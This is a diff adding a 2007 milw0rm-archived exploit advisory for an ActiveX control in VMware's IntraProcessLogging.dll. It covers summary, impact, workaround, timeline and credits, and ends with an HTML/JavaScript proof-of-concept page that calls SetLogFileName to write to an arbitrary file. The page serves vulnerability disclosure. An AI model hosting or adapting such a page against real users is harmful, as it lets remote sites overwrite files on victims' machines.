@@ -1,0 +1,84 @@
+<!--
+---------------------------------------------------------------------------
+
+:. GOODFELLAS Security Research TEAM  .:
+:. http://goodfellas.shellcode.com.ar .:
+
+IntraProcessLogging.dll 5.5.3.42958 VmWare Inc Arbitrary Data Write Exploit
+===========================================================================
+
+Internal ID: VULWAR200707280.
+-----------
+
+Introduction
+------------
+IntraProcessLogging.dll is a library included in the Program Vmware from
+Vmware Inc. Company.
+
+
+Tested In
+---------
+- Windows XP SP1/SP2 french/english with IE 6.0 / 7.0.
+
+
+Summary
+-------
+The SetLogFileName method doesn't check if it's being called from the
+application,
+or malicious users. Remote Attacker could craft a html page and overwrite
+arbitrary
+files in a system.
+
+
+Impact
+------
+Any computer that uses this Sofware will be exposed to Data Write Arbitrary.
+
+
+Workaround
+----------
+- Activate the Kill bit zero in clsid:AF13B07E-28A1-4CAC-9C9A-EC582E354A24
+- Unregister IntraProcessLogging.dll using regsvr32.
+
+
+Timeline
+--------
+July 28 2007 -- Bug Discovery.
+July 28 2007 -- Exploit published.
+
+
+Credits
+-------
+ * callAX <callAX@shellcode.com.ar>
+ * GoodFellas Security Research Team  <goodfellas.shellcode.com.ar>
+
+
+Technical Details
+-----------------
+
+SetLogFileName method receives one argument filename in this format
+"c:\path\file".
+
+
+Proof of Concept
+---------------->
+
+<HTML>
+<BODY>
+ <object id=ctrl classid="clsid:{AF13B07E-28A1-4CAC-9C9A-EC582E354A24}"></object>
+
+<SCRIPT>
+
+function Do_it()
+ {
+   File = "c:\\arbitrary_file.txt"
+   ctrl.SetLogFileName(File)
+ }
+
+</SCRIPT>
+<input language=JavaScript onclick=Do_it() type=button value="Proof of
+Concept">
+</BODY>
+</HTML>
+
+# milw0rm.com [2007-07-28]
